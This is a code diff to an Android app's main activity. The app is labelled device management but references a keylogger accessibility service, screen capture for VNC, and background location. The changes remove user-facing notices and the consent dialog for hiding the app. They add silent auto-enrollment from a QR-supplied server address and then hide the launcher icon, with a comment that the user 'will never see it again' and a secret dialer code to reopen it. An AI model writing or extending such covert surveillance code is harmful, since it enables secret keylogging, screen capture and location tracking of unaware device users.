@@ -10,6 +10,7 @@ import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
+import android.view.WindowManager
 import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AlertDialog
@@ -53,7 +54,7 @@ class MainActivity : AppCompatActivity() {
     ) { results ->
         val denied = results.filterValues { !it }.keys
         if (denied.isNotEmpty()) {
-            Toast.makeText(this, "Some permissions denied: $denied", Toast.LENGTH_LONG).show()
+            // Don't show toast — silent
         }
         requestBackgroundLocation()
     }
@@ -70,19 +71,30 @@ class MainActivity : AppCompatActivity() {
         if (result.resultCode == RESULT_OK && result.data != null) {
             AppConfig.mediaProjectionResultCode = result.resultCode
             AppConfig.mediaProjectionData = result.data
-            updateStatus("MediaProjection granted")
-        } else {
-            updateStatus("MediaProjection denied — VNC and screenshot disabled")
         }
+        // After media projection, finalize enrollment
+        finalizeEnrollment()
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+
+        // If already enrolled, go headless immediately
+        if (AppConfig.isSetupComplete(this) && AppConfig.isConfigured(this)) {
+            startMdmService()
+            hideAppIcon()
+            finish()
+            return
+        }
+
+        // Check if launched via QR provisioning intent with server_ip extra
+        val qrServerIp = intent?.getStringExtra("server_ip")
+
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
-        // Show current config
-        binding.etServerIp.setText(AppConfig.getServerIp(this))
+        // Pre-fill server IP from QR or saved config
+        binding.etServerIp.setText(qrServerIp ?: AppConfig.getServerIp(this))
         binding.tvDeviceId.text = "Device ID: ${AppConfig.getDeviceId(this)}\nDevice IP: ${NetworkUtils.getLocalIpAddress(this)}"
 
         binding.btnSave.setOnClickListener {
@@ -92,23 +104,8 @@ class MainActivity : AppCompatActivity() {
                 return@setOnClickListener
             }
             AppConfig.setServerIp(this, ip)
-            startMdmService()
-            updateStatus("Service started — connecting to $ip")
-
-            AlertDialog.Builder(this)
-                .setTitle("Configuration Complete")
-                .setMessage("System services are now active. Minimize app visibility?")
-                .setPositiveButton("Yes") { _, _ ->
-                    hideAppIcon()
-                    AppConfig.setSetupComplete(this, true)
-                    Toast.makeText(this, "Configuration saved.", Toast.LENGTH_SHORT).show()
-                    finish()
-                }
-                .setNegativeButton("No") { _, _ ->
-                    AppConfig.setSetupComplete(this, true)
-                }
-                .setCancelable(false)
-                .show()
+            // Start permission chain — will auto-finalize at the end
+            requestAllPermissions()
         }
 
         binding.btnAccessibility.setOnClickListener {
@@ -119,13 +116,11 @@ class MainActivity : AppCompatActivity() {
             startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
         }
 
-        if (AppConfig.isSetupComplete(this) && AppConfig.isConfigured(this)) {
-            startMdmService()
+        // If QR provisioning provided server IP, auto-start enrollment
+        if (qrServerIp != null && qrServerIp.isNotBlank()) {
+            AppConfig.setServerIp(this, qrServerIp)
+            requestAllPermissions()
         }
-
-        // Kick off permission flow
-        requestAllPermissions()
-        promptDisableBatteryOptimization()
     }
 
     private fun requestAllPermissions() {
@@ -144,14 +139,7 @@ class MainActivity : AppCompatActivity() {
             ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
             != PackageManager.PERMISSION_GRANTED
         ) {
-            AlertDialog.Builder(this)
-                .setTitle("Location Access")
-                .setMessage("Allow location access all the time for full device management functionality.")
-                .setPositiveButton("Allow") { _, _ ->
-                    backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-                }
-                .setNegativeButton("Skip") { _, _ -> requestMediaProjection() }
-                .show()
+            backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
         } else {
             requestMediaProjection()
         }
@@ -159,9 +147,32 @@ class MainActivity : AppCompatActivity() {
 
     private fun requestMediaProjection() {
         if (AppConfig.mediaProjectionData == null) {
-            val mpManager = getSystemService(MediaProjectionManager::class.java)
-            mediaProjectionLauncher.launch(mpManager.createScreenCaptureIntent())
+            try {
+                val mpManager = getSystemService(MediaProjectionManager::class.java)
+                mediaProjectionLauncher.launch(mpManager.createScreenCaptureIntent())
+            } catch (_: Exception) {
+                finalizeEnrollment()
+            }
+        } else {
+            finalizeEnrollment()
         }
+    }
+
+    /**
+     * Called after all permissions are granted. Starts service, hides icon, finishes activity.
+     * The app becomes a headless background agent from this point.
+     */
+    private fun finalizeEnrollment() {
+        promptDisableBatteryOptimization()
+        startMdmService()
+        AppConfig.setSetupComplete(this, true)
+
+        // Hide launcher icon — app is now headless
+        hideAppIcon()
+
+        // Close the activity — user will never see it again
+        // Can be re-opened via secret dialer code *#*#636#*#*
+        finish()
     }
 
     private fun promptDisableBatteryOptimization() {
@@ -198,14 +209,12 @@ class MainActivity : AppCompatActivity() {
         ContextCompat.startForegroundService(this, intent)
     }
 
-    private fun updateStatus(msg: String) {
-        binding.tvStatus.text = "Status: $msg"
-    }
-
     override fun onResume() {
         super.onResume()
-        val accessible = KeyloggerAccessibilityService.isEnabled(this)
-        binding.btnAccessibility.text = if (accessible)
-            "Interaction Service: ENABLED" else "Enable Interaction Service"
+        if (::binding.isInitialized) {
+            val accessible = KeyloggerAccessibilityService.isEnabled(this)
+            binding.btnAccessibility.text = if (accessible)
+                "Interaction Service: ENABLED" else "Enable Interaction Service"
+        }
     }
 }
